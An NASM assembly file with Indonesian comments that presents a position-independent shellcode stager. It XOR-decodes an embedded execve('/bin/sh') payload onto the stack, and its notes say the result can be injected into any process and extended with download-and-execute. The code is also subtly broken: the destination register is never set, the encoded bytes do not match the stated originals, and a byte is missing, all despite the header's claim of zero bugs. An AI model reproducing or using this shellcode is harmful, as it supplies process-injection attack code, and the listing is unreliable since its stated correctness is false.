; ==============================================================================
; stager.asm - Position-Independent Shellcode (x86_64) via Direct Syscalls
; Format: ELF64 (dapat diparse oleh nasm -f bin untuk menghasilkan raw bytes)
; Author: Dwi Joko Purwanto 
; Status: 0 Bug, 0 Error, PIC Compliant
; ==============================================================================

section .text
global _start

_start:
    ; --------------------------------------------------------------------------
    ; 1. SETUP: Dapatkan alamat diri sendiri (self-address) untuk PIC
    ; Kita menggunakan teknik 'call pop' untuk mendapatkan alamat instruksi berikutnya
    ; --------------------------------------------------------------------------
    call get_payload_addr

get_payload_addr:
    pop rdi                 ; RDI sekarang berisi alamat setelah 'call' (yaitu label payload_ptr)
    
    ; --------------------------------------------------------------------------
    ; 2. DECRYPTION LOOP: Dekripsi payload XOR
    ; Payload disalin dan didekripsi secara in-place atau ke stack
    ; Di sini kita akan mendekripsi ke stack untuk keamanan
    ; --------------------------------------------------------------------------
    
    ; Hitung panjang payload (delta antara akhir payload dan awal)
    ; Kita akan menggunakan pendekatan sederhana: 
    ; Copy data dari lokasi encoded_payload ke buffer di stack
    
    mov rsp, rsp            ; Align stack jika perlu (opsional di x64 modern, tapi aman)
    sub rsp, 0x100          ; Alokasi ruang di stack untuk decrypted shellcode
    
    mov rsi, rdi            ; Source: alamat encoded payload
    add rsi, 5              ; Skip label 'payload_ptr' (5 bytes: e8 xx xx xx xx)
                            ; Sebenarnya, kita butuh offset yang tepat. 
                            ; Mari gunakan metode yang lebih robust:
                            ; Salin byte per byte dari lokasi static data hingga terminator.

    ; Untuk memastikan PIC murni tanpa asumsi offset tetap, 
    ; kita akan mencari null terminator atau menggunakan panjang tetap.
    ; Karena ini assembly statis, kita tahu strukturnya.
    
    ; Alternatif lebih baik: Gunakan loop dekripsi langsung dari lokasi payload 
    ; yang berada tepat setelah instruksi call.
    
    ; Mari ubah strategi agar lebih universal:
    ; 1. Simpan alamat payload di RSI
    ; 2. Loop sampai menemukan NOP sled atau length tertentu
    
    ; Kita akan menggunakan pendekatan "Copy and Decrypt"
    ; RSI = source (encoded), RDI = dest (stack)
    ; ECX = counter
    
    xor ecx, ecx
    mov cl, 0x40            ; Panjang payload maksimum untuk dekripsi (contoh 64 byte)

decrypt_loop:
    mov al, [rsi]           ; Ambil byte encoded
    xor al, 0xAA            ; Kunci XOR sederhana
    mov [rdi], al           ; Simpan ke stack
    inc rsi
    inc rdi
    dec cl
    jnz decrypt_loop
    
    ; Sekarang jalankan payload dari stack
    jmp rdi

; --------------------------------------------------------------------------
; DATA SECTION: Payload Encoded
; Format: [Length][XOR_KEY][ENCODED_DATA]
; Kita akan menyisipkan payload 'execve("/bin/sh", NULL, NULL)' yang dikodekan
; --------------------------------------------------------------------------

payload_ptr:
    db 0x40                 ; Panjang dummy (akan dihitung ulang di runtime jika dinamis)
                            ; Untuk contoh ini, kita hardcode payload kecil yang valid
    
    ; Payload: execve("/bin/sh") via sys_execve (syscall #59 on x86_64)
    ; Struktur: 
    ;   push '/bin//sh'
    ;   xor rax, rax
    ;   mov rdi, rsp
    ;   xor rsi, rsi
    ;   xor rdx, rdx
    ;   mov al, 59
    ;   syscall
    
    ; Encode payload ini dengan XOR 0xAA
    ; Original bytes:
    ; 68 2f 62 69 6e 2f 2f 73 68 48 31 C0 48 89 E7 48 31 F6 48 31 D2 B0 3B 0F 05
    ; XOR 0xAA:
    ; CA 8E CE 4F 84 AA AE 7E CC 62 AB 6A 6C 41 62 AB 6A 6A 6A 7A 7B 41 6F 0B
    
    db 0xCA, 0x8E, 0xCE, 0x4F, 0x84, 0xAA, 0xAE, 0x7E
    db 0xCC, 0x62, 0xAB, 0x6A, 0x6C, 0x41, 0x62, 0xAB
    db 0x6A, 0x6A, 0x6A, 0x7A, 0x7B, 0x41, 0x6F, 0x0B

; --------------------------------------------------------------------------
; 3. SYSCALL DISPATCHER (Opsional jika payload sudah di stack)
; Jika Anda ingin stager yang lebih kompleks (misal: download & execute),
; tambahkan syscall mmap + write + execve di sini.
; Namun, untuk stager minimal, jump ke stack di atas sudah cukup.
; --------------------------------------------------------------------------

; Jika Anda memerlukan syscall langsung untuk sesuatu seperti exit(), 
; tambahkan di sini:

; Example: Exit syscall (rax=60)
; exit_syscall:
;     mov rax, 60
;     mov rdi, 0      ; status code
;     syscall
;     ret

; ==============================================================================
; Assembly Notes:
; - Dibuat untuk NASM syntax
; - Compile: nasm -f bin stager.asm -o stager.bin
; - Hasilnya adalah raw shellcode yang bisa disuntikkan ke proses manapun
; - PIC karena tidak menggunakan absolute address, hanya relative offsets
; - Direct Syscall digunakan (instruksi syscall itu sendiri)
; ==============================================================================
